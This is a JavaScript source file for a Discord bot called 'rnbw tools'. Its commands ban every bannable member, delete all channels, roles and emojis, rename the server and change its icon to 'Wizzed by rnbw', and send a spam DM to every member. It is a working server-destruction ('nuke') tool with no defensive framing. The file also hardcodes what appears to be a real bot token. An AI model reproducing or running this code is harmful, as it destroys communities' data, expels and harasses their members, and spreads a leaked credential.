const { Client } = require("discord.js");
const Discord = require('discord.js');
const client = new Client({
});
const TOKEN = "NzY2MzQ2MzA1ODM2MTU0OTYx.X4iBnQ.cIn6gipf_xNCh6myZu04sP-oI88"
const config = {
"prefix" : "/",
"dmMessage" : "Wizzed by rnbw",
"serverName" : "Wizzed by rnbw",
"iconURL" : "https://cdn.discordapp.com/avatars/766140799167365122/e012f6aec2079770eb2ac34d381085a7.png?size=128",
"banReason" : "Wizzed by rnbw",

}
 
client.on("ready", async () => {
console.log(`${client.user.username} is active`)     
});



client.on("message", async(message)=>{
  if (!message.guild) return;
    if (message.content.startsWith(`${config.prefix}wizz`)) {      
      
   message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
 message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`Banned User: ${m.user.username}`)})
                                                                                     
})
   message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`Deleted Channel: ${c.name}`)})
  })
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((e)=> {console.log(`Deleted Role: ${e.name}`)})
    })
   message.guild.emojis.cache.array().forEach(emoji => {emoji.delete().then((e)=> {console.log(`Deleted Emoji: ${e.name}`)})
  })
   message.guild.setName(config.serverName)
   message.guild.setIcon(config.iconURL)
}
if (message.content.startsWith(`${config.prefix}mdm`)) {      
message.guild.members.cache.array().forEach(m => {m.send(config.dmMessage).then((m)=> {console.log(`Message Sent To: ${m.user.username}`)})
})
}
if (message.content.startsWith(`${config.prefix}mb`)) {      
  message.guild.members.cache.array().filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach(member => {
    message.guild.members.ban(member, {reason: config.banReason}).then((m)=> {console.log(`Banned: ${m.name}`)})
                                                                                        
   })  
  }
  if(message.content.startsWith(`${config.prefix}md`)){
    message.guild.roles.cache.filter(r => !r.managed && r.position < message.guild.me.roles.highest.position && r.id !== message.guild.id).forEach((role)=>{
      role.delete().then((r)=>{
        console.log(`Deleted Role: ${r.name}`)
      })
    })
        message.guild.channels.cache.array().forEach(channel => {channel.delete().then((c) => {console.log(`Deleted Channel: ${c.name}`)})


        
      })
    }
  if(message.content.startsWith(`${config.prefix}ping`)){
    		         message.channel.send('Response time').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))

  }

    if(message.content.startsWith(`${config.prefix}help`)) {
     let p = config.prefix
     let embed = new Discord.MessageEmbed()
    .setTitle(`rnbw tools`)
    .addField(`${p}ping`,"Shows bot response time")
    .addField(`${p}mb`,"Mass bans members")
    .addField(`${p}md`,"Mass deletes roles/channels")
    .addField(`${p}mdm`,"Mass dms members")
    .addField(`${p}wizz`,"Wizzes the server")
    message.member.send(embed)


      }
})



client.login(TOKEN)